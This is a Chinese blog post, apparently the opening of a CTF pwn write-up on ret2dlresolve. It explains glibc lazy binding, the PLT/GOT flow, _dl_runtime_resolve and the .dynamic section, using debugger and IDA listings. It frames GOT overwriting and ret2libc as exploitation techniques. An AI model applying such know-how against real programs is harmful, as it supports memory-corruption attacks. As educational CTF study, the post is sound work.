<!DOCTYPE html> <html lang="cn"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> glibc动态链接重定位 + CNSS2024 pwn boss wp | Leak Box 258 </title> <meta name="author" content="Leak Box 258"> <meta name="description" content="A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design. "> <meta name="keywords" content="PL, Rust, C++, Linux"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%99%BF%EF%B8%8F&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://leakbox258.github.io/blog/2024/ret2dlresolve/"> <script src="/assets/js/theme.js?a81d82887dd692e91686b43de4542f18"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
    initTheme();
  </script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Leak</span> Box 258 </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item active"> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repositories </a> </li> <li class="nav-item "> <a class="nav-link" href="/books/">bookshelf </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <a class="dropdown-item " href="/books/">bookshelf</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/blog/">blog</a> </div> </li> <li class="nav-item"> <button id="search-toggle" title="Search" onclick="openSearchModal()"> <span class="nav-link">ctrl k <i class="ti ti-search"></i></span> </button> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">glibc动态链接重定位 + CNSS2024 pwn boss wp</h1> <p class="post-meta"> Created on October 02, 2024 by 久菜合子 </p> <p class="post-tags"> <a href="/blog/2024"> <i class="fa-solid fa-calendar fa-sm"></i> 2024 </a>   ·   <a href="/blog/tag/ctf"> <i class="fa-solid fa-hashtag fa-sm"></i> CTF</a>   <a href="/blog/tag/pwn"> <i class="fa-solid fa-hashtag fa-sm"></i> pwn</a> </p> </header> <article class="post-content"> <div id="markdown-content"> <h4 id="参考资料">参考资料：</h4> <p>实例文件为boss题的attachment，见github<br> https://zhuanlan.zhihu.com/p/37572651<br> https://ctf-wiki.org/executable/elf/structure/basic-info/<br> https://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/ <br> https://www.soinside.com/question/AENBEApAgMMbfzPviVeoBc <br></p> <h3 id="动态链接程序的装载">动态链接程序的装载</h3> <h5 id="当程序使用动态链接时才会存在延迟绑定技术一个动态链接的程序除了要将程序本身加载进内存之外还需要加载对应使用的libc这一步由ld动态链接器实现由于动态链接信息与程序的形成和加载由莫大关系所以在linux系统下这些信息必须在二进制文件中明确写出而不是存放在某个path中">   当程序使用动态链接时，才会存在延迟绑定技术。<br>   一个动态链接的程序，除了要将程序本身加载进内存之外，还需要加载对应使用的libc，这一步由ld动态链接器实现。<br>   由于动态链接信息与程序的形成和加载由莫大关系，所以在linux系统下，这些信息必须在二进制文件中明确写出，而不是存放在某个PATH中。</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>首先，我们来关注一下链接视图。

文件开始处是 ELF 头部（ ELF Header），它给出了整个文件的组织情况。

如果程序头部表（Program Header Table）存在的话，它会告诉系统如何创建进程。用于生成进程的目标文件必须具有程序头部表，但是重定位文件不需要这个表。

节区部分包含在链接视图中要使用的大部分信息：指令、数据、符号表、重定位信息等等。

节区头部表（Section Header Table）包含了描述文件节区的信息，每个节区在表中都有一个表项，会给出节区名称、节区大小等信息。用于链接的目标文件必须有节区头部表，其它目标文件则无所谓，可以有，也可以没有。

</code></pre></div></div> <p><strong><em>来自CTFwiki</em></strong></p> <h5 id="这里谈及的是linking-view链接视图也就是程序没有加载时的结构header-table中有关链接的信息在装载时被读取作为构建executing-view执行视图的依据如下ida也读取到了这些信息">   这里谈及的是Linking View（链接视图），也就是程序没有加载时的结构，Header table中有关链接的信息在装载时被读取，作为构建Executing View（执行视图）的依据。如下，IDA也读取到了这些信息。</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LOAD:0000000000000000
LOAD:0000000000000000 <span class="p">;</span> File Name   : C:<span class="se">\U</span>sers<span class="se">\3</span>0336<span class="se">\D</span>esktop<span class="se">\p</span>wn
LOAD:0000000000000000 <span class="p">;</span> Format      : ELF64 <span class="k">for </span>x86-64 <span class="o">(</span>Shared object<span class="o">)</span>
LOAD:0000000000000000 <span class="p">;</span> Interpreter <span class="s1">'/lib64/ld-linux-x86-64.so.2'</span>
LOAD:0000000000000000 <span class="p">;</span> Needed Library <span class="s1">'libc.so.6'</span>
</code></pre></div></div> <h5 id="不难发现即使是在桌面中的文件ida依然可以正确读取interpreter的位置因为这些信息已经写死在二进制文件中常用的工具patchelf也是通过直接修改文件达成interpreter和libc的更换">   不难发现，即使是在桌面中的文件，IDA依然可以正确读取Interpreter的位置，因为这些信息已经写死在二进制文件中。<br>   常用的工具<code class="language-plaintext highlighter-rouge">patchelf</code>也是通过直接修改文件达成Interpreter和libc的更换。</h5> <h3 id="延迟绑定系统">延迟绑定系统</h3> <h5 id="对于动态链接库的使用主要关注点在于外部函数的使用当程序和库被装载在内存之后text段的指令就可以通过call来实现对外部函数的调用对于内部的函数call指令相当于是push和jmp然后到达对应地址之后开始压栈执行等而call外部函数时对应地址是另外一条jmp它会跳转到该函数的plt的位置如果这个外部函数已经被调用过至少一次那么plt处第二次跳转会到达该函数的got表项的位置这个got表项又是另一个jmp指令这次终于到达了外部函数的真正地址然后开始压栈执行这是外部函数大多数情况下的调用过程">   对于动态链接库的使用，主要关注点在于外部函数的使用<br>   当程序和库被装载在内存之后，.text段的指令就可以通过<code class="language-plaintext highlighter-rouge">call</code>来实现对外部函数的调用，对于内部的函数<code class="language-plaintext highlighter-rouge">call</code>指令相当于是<code class="language-plaintext highlighter-rouge">push</code>和<code class="language-plaintext highlighter-rouge">jmp</code>，然后到达对应地址之后开始压栈、执行等。而<code class="language-plaintext highlighter-rouge">call</code>外部函数时，对应地址是另外一条<code class="language-plaintext highlighter-rouge">jmp</code>，它会跳转到该函数的<code class="language-plaintext highlighter-rouge">plt</code>的位置。<br>   如果这个外部函数已经被调用过至少一次，那么<code class="language-plaintext highlighter-rouge">plt</code>处第二次跳转会到达该函数的<code class="language-plaintext highlighter-rouge">got</code>表项的位置，这个<code class="language-plaintext highlighter-rouge">got</code>表项又是另一个<code class="language-plaintext highlighter-rouge">jmp</code>指令，这次终于到达了外部函数的真正地址，然后开始压栈、执行。这是外部函数大多数情况下的调用过程。<br> </h5> <h5 id="众所周知我们在打ret2libc时需要先泄露出libc中某一个函数在内存中的真实地址然后根据已知的偏移找到我们需要的东西即使是-no-pie也是一样所以说由于种种原因即使程序本身的地址可以通过静态分析获得确切地址也无法预先找到libc的加载地址那么问题来了由于text肯定是没法跟着libc加载地址一起变化的那么在使用外部函数时怎样才能保证外部函数地址的正确呢这就是第一次调用外部函数时需要解决的也就是对外部函数进行重定位-">   众所周知，我们在打<code class="language-plaintext highlighter-rouge">ret2libc</code>时，需要先泄露出libc中某一个函数在内存中的真实地址，然后根据已知的偏移找到我们需要的东西，即使是<code class="language-plaintext highlighter-rouge">-no-pie</code>也是一样。所以说由于种种原因，即使程序本身的地址可以通过静态分析获得确切地址，也无法预先找到libc的加载地址。<br>   那么问题来了，由于<code class="language-plaintext highlighter-rouge">.text</code>肯定是没法跟着libc加载地址一起变化的，那么在使用外部函数时，怎样才能保证外部函数地址的正确呢？这就是第一次调用外部函数时需要解决的，也就是对外部函数进行重定位. <br> </h5> <h5 id="首先解决一个疑惑为什么是在第一次调用时才重定位呢实际上不一定是第一次调用才重定位也可能在main之前就被处理好了但在具体实现尤其是有大量外部函数的调用时上还是第一次调用时重定位居多很简单因为重定位是一个比较消耗时间的过程而有些函数比如异常时结束进程的exit很可能根本就用不上所以就延迟绑定lazy-load没ddl绝不干活">   首先解决一个疑惑，为什么是在第一次调用时才重定位呢？实际上，不一定是第一次调用才重定位，也可能在<code class="language-plaintext highlighter-rouge">main()</code>之前就被处理好了，但在具体实现（尤其是有大量外部函数的调用时）上，还是第一次调用时重定位居多。很简单，因为重定位是一个比较消耗时间的过程，而有些函数（比如异常时结束进程的<code class="language-plaintext highlighter-rouge">exit()</code>）很可能根本就用不上，所以就延迟绑定（lazy load），没ddl绝不干活。<br> </h5> <h5 id="由于延迟绑定的存在所以之前所说的got表那一内存页在完成所有重定位之前一直都要保持可写这就是got表篡改这一漏洞的实现逻辑既在所有重定位完成之前篡改一个或多个got表项这个办法在partial-relro和no-relro时可用在full-relro时函数被提前重定位然后内存页变成只读就没办法改了">   由于延迟绑定的存在，所以之前所说的<code class="language-plaintext highlighter-rouge">got</code>表那一内存页在完成所有重定位之前，一直都要保持可写。这就是<code class="language-plaintext highlighter-rouge">got</code>表篡改这一漏洞的实现逻辑，既在所有重定位完成之前篡改一个或多个<code class="language-plaintext highlighter-rouge">got</code>表项。这个办法在<code class="language-plaintext highlighter-rouge">partial RELRO</code>和<code class="language-plaintext highlighter-rouge">no RELRO</code>时可用，在<code class="language-plaintext highlighter-rouge">full RELRO</code>时，函数被提前重定位，然后内存页变成只读，就没办法改了。<br> </h5> <h3 id="延迟绑定-detail">延迟绑定 detail</h3> <h5 id="先来一个一个demo这个是最原始纯真的延迟绑定后面会来一个带-fcf-protectionnone的demo">   先来一个一个demo，这个是最原始纯真的延迟绑定，后面会来一个带<code class="language-plaintext highlighter-rouge">-fcf-protection=none</code>的demo。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="s">"what a day!"</span><span class="p">;</span>
    <span class="n">puts</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">gcc</span> <span class="n">lazy_load</span><span class="p">.</span><span class="n">c</span> <span class="o">-</span><span class="n">z</span> <span class="n">lazy</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="n">pie</span> <span class="o">-</span><span class="n">fcf</span><span class="o">-</span><span class="n">protection</span><span class="o">=</span><span class="n">none</span> <span class="o">-</span><span class="n">o</span> <span class="n">lazy_load</span>
</code></pre></div></div> <h5 id="-在main中第一次调用puts可以看到是putsplt">    在<code class="language-plaintext highlighter-rouge">main()</code>中第一次调用<code class="language-plaintext highlighter-rouge">puts()</code>，可以看到是<code class="language-plaintext highlighter-rouge">puts@plt</code> </h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">►</span> <span class="mh">0x401140</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">26</span><span class="o">&gt;</span>    <span class="n">call</span>   <span class="n">puts</span><span class="err">@</span><span class="n">plt</span>                    <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
</code></pre></div></div> <h5 id="-然后进去看看">    然后进去看看</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="mh">0x401030</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;:</span> <span class="n">jmp</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0x2fe2</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0x404018</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">got</span><span class="p">.</span><span class="n">plt</span><span class="o">&gt;</span>
   <span class="mh">0x401036</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>       <span class="n">push</span>   <span class="mh">0x0</span>
   <span class="mh">0x40103b</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">+</span><span class="mi">11</span><span class="o">&gt;:</span>      <span class="n">jmp</span>    <span class="mh">0x401020</span>
</code></pre></div></div> <h5 id="-再到putsgotplt看一眼这一块有些不知所云网上收集的资料倒是比较容易一致的说法是这里是存放的是putsplt--6的指令也就是又跳转回去到了下面的0x401036的位置">    再到<code class="language-plaintext highlighter-rouge">puts@got.plt</code>看一眼，这一块有些不知所云，网上收集的资料倒是比较容易，一致的说法是，这里是存放的是<code class="language-plaintext highlighter-rouge">puts@plt + 6</code>的指令，也就是又跳转回去，到了下面的<code class="language-plaintext highlighter-rouge">0x401036</code>的位置。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="mh">0x404018</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">got</span><span class="p">.</span><span class="n">plt</span><span class="o">&gt;:</span>     <span class="n">ss</span> <span class="n">adc</span> <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="mh">0x0</span><span class="p">],</span><span class="n">al</span>
   <span class="mh">0x40401c</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">got</span><span class="p">.</span><span class="n">plt</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;:</span>   <span class="n">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rax</span><span class="p">],</span><span class="n">al</span>
   <span class="mh">0x40401e</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">got</span><span class="p">.</span><span class="n">plt</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>   <span class="n">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rax</span><span class="p">],</span><span class="n">al</span>
</code></pre></div></div> <h5 id="再回来6位置push一个0x0到栈上然后又跳">   再回来，<code class="language-plaintext highlighter-rouge">+6</code>位置<code class="language-plaintext highlighter-rouge">push</code>一个<code class="language-plaintext highlighter-rouge">0x0</code>到栈上，然后又跳</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="mh">0x401036</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>       <span class="n">push</span>   <span class="mh">0x0</span>
   <span class="mh">0x40103b</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">+</span><span class="mi">11</span><span class="o">&gt;:</span>      <span class="n">jmp</span>    <span class="mh">0x401020</span>
</code></pre></div></div> <h5 id="不难看到这块儿正好在putsplt上具体来说是它在plt头部所以也叫plt0又向栈上push然后jmp到0x404010">   不难看到，这块儿正好在<code class="language-plaintext highlighter-rouge">puts@plt</code>上，具体来说是它在plt头部，所以也叫plt[0]<br>   又向栈上<code class="language-plaintext highlighter-rouge">push</code>，然后<code class="language-plaintext highlighter-rouge">jmp</code>到<code class="language-plaintext highlighter-rouge">0x404010</code> </h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="mh">0x401020</span><span class="o">:</span>    <span class="n">push</span>   <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0x2fe2</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0x404008</span>
   <span class="mh">0x401026</span><span class="o">:</span>    <span class="n">jmp</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0x2fe4</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0x404010</span>
   <span class="mh">0x40102c</span><span class="o">:</span>    <span class="n">nop</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="mh">0x0</span><span class="p">]</span>
   <span class="mh">0x401030</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;:</span> <span class="n">jmp</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0x2fe2</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0x404018</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">got</span><span class="p">.</span><span class="n">plt</span><span class="o">&gt;</span>
</code></pre></div></div> <h5 id="0x404010是一个函数的地址这个函数就是_dl_runtime_resolve用于运行时进行外部函数重定位而刚才的两次push是为该函数提供了参数第一个push的是rel_arg是一个偏移值第二个是link_map结构体">   <code class="language-plaintext highlighter-rouge">0x404010</code>是一个函数的地址，这个函数就是<code class="language-plaintext highlighter-rouge">_dl_runtime_resolve()</code>，用于运行时进行外部函数重定位，而刚才的两次<code class="language-plaintext highlighter-rouge">push</code>，是为该函数提供了参数，第一个<code class="language-plaintext highlighter-rouge">push</code>的是<code class="language-plaintext highlighter-rouge">rel_arg</code>，是一个偏移值，第二个是<code class="language-plaintext highlighter-rouge">link_map</code>结构体。<br> </h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0x404008</span><span class="o">:</span>       <span class="mh">0x00007ffff7ffe2e0</span>      <span class="mh">0x00007ffff7fd8d30</span> <span class="err">#</span> <span class="n">linkmap</span> <span class="err">#</span> <span class="n">_dl_runtime_resolve</span>
<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">10</span><span class="n">gx</span> <span class="mh">0x00007ffff7fd8d30</span>
<span class="mh">0x7ffff7fd8d30</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsavec</span><span class="o">&gt;:</span>    <span class="mh">0xe3894853fa1e0ff3</span>      <span class="mh">0x4d252b48c0e48348</span>
<span class="mh">0x7ffff7fd8d40</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsavec</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;:</span> <span class="mh">0x482404894800023f</span>      <span class="mh">0x2454894808244c89</span>
<span class="mh">0x7ffff7fd8d50</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsavec</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;:</span> <span class="mh">0x8948182474894810</span>      <span class="mh">0x282444894c20247c</span>
<span class="mh">0x7ffff7fd8d60</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsavec</span><span class="o">+</span><span class="mi">48</span><span class="o">&gt;:</span> <span class="mh">0x00eeb830244c894c</span>      <span class="mh">0x24948948d2310000</span>
<span class="mh">0x7ffff7fd8d70</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsavec</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;:</span> <span class="mh">0x2494894800000250</span>      <span class="mh">0x2494894800000258</span>
</code></pre></div></div> <h5 id="需要注意的是无论是32还是64位都是这一套模式64位在这里不会用寄存器传递这两个参数">   需要注意的是，无论是32还是64位都是这一套模式，64位在这里不会用寄存器传递这两个参数。</h5> <h3 id="_dl_runtime_resolve如何重定位">_dl_runtime_resolve()如何重定位</h3> <h5 id="在具体讨论之前补充一些关于segment的东西">   在具体讨论之前，补充一些关于Segment的东西<br> </h5> <h5 id="dynamic存储很多关于动态链接的信息的结构体elf64_dyn结构体内包含的是信息的种类以及地址">   .dynamic，存储很多关于动态链接的信息的结构体（ELF64_Dyn），结构体内包含的是信息的种类以及地址。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">LOAD:</span><span class="mf">0000000000403E20</span> <span class="p">;</span> <span class="n">ELF</span> <span class="n">Dynamic</span> <span class="n">Information</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span> <span class="p">;</span> <span class="o">===========================================================================</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span> <span class="p">;</span> <span class="n">Segment</span> <span class="n">type</span><span class="o">:</span> <span class="n">Pure</span> <span class="n">data</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span> <span class="p">;</span> <span class="n">Segment</span> <span class="n">permissions</span><span class="o">:</span> <span class="n">Read</span><span class="o">/</span><span class="n">Write</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span> <span class="n">LOAD</span>            <span class="n">segment</span> <span class="n">mempage</span> <span class="n">public</span> <span class="err">'</span><span class="n">DATA</span><span class="err">'</span> <span class="n">use64</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span>                 <span class="n">assume</span> <span class="n">cs</span><span class="o">:</span><span class="n">LOAD</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span>                 <span class="p">;</span><span class="n">org</span> <span class="mf">403E20</span><span class="n">h</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span> <span class="n">_DYNAMIC</span>        <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">1</span><span class="p">,</span> <span class="mi">18</span><span class="n">h</span><span class="o">&gt;</span>      <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004001</span><span class="n">A0</span><span class="err">↑</span><span class="n">o</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span>                                         <span class="p">;</span> <span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="n">plt</span><span class="o">:</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="err">↓</span><span class="n">o</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span>                                         <span class="p">;</span> <span class="n">DT_NEEDED</span> <span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E30</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">0</span><span class="n">Ch</span><span class="p">,</span> <span class="mi">401000</span><span class="n">h</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">DT_INIT</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E40</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">0</span><span class="n">Dh</span><span class="p">,</span> <span class="mi">40114</span><span class="n">Ch</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">DT_FINI</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E50</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">19</span><span class="n">h</span><span class="p">,</span> <span class="mf">403E10</span><span class="n">h</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">DT_INIT_ARRAY</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E60</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">1</span><span class="n">Bh</span><span class="p">,</span> <span class="mi">8</span><span class="o">&gt;</span>      <span class="p">;</span> <span class="n">DT_INIT_ARRAYSZ</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E70</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">1</span><span class="n">Ah</span><span class="p">,</span> <span class="mf">403E18</span><span class="n">h</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">DT_FINI_ARRAY</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E80</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">1</span><span class="n">Ch</span><span class="p">,</span> <span class="mi">8</span><span class="o">&gt;</span>      <span class="p">;</span> <span class="n">DT_FINI_ARRAYSZ</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E90</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">6</span><span class="n">FFFFEF5h</span><span class="p">,</span> <span class="mi">4003</span><span class="n">A0h</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">DT_GNU_HASH</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">EA0</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">5</span><span class="p">,</span> <span class="mi">400420</span><span class="n">h</span><span class="o">&gt;</span>  <span class="p">;</span> <span class="n">DT_STRTAB</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">EB0</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">6</span><span class="p">,</span> <span class="mi">4003</span><span class="n">C0h</span><span class="o">&gt;</span>  <span class="p">;</span> <span class="n">DT_SYMTAB</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">EC0</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">0</span><span class="n">Ah</span><span class="p">,</span> <span class="mi">48</span><span class="n">h</span><span class="o">&gt;</span>    <span class="p">;</span> <span class="n">DT_STRSZ</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">ED0</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">0</span><span class="n">Bh</span><span class="p">,</span> <span class="mi">18</span><span class="n">h</span><span class="o">&gt;</span>    <span class="p">;</span> <span class="n">DT_SYMENT</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">EE0</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">15</span><span class="n">h</span><span class="p">,</span> <span class="mi">0</span><span class="o">&gt;</span>      <span class="p">;</span> <span class="n">DT_DEBUG</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">EF0</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">3</span><span class="p">,</span> <span class="mi">404000</span><span class="n">h</span><span class="o">&gt;</span>  <span class="p">;</span> <span class="n">DT_PLTGOT</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F00</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">2</span><span class="p">,</span> <span class="mi">18</span><span class="n">h</span><span class="o">&gt;</span>      <span class="p">;</span> <span class="n">DT_PLTRELSZ</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F10</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">14</span><span class="n">h</span><span class="p">,</span> <span class="mi">7</span><span class="o">&gt;</span>      <span class="p">;</span> <span class="n">DT_PLTREL</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F20</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">17</span><span class="n">h</span><span class="p">,</span> <span class="mi">4004</span><span class="n">D0h</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">DT_JMPREL</span>
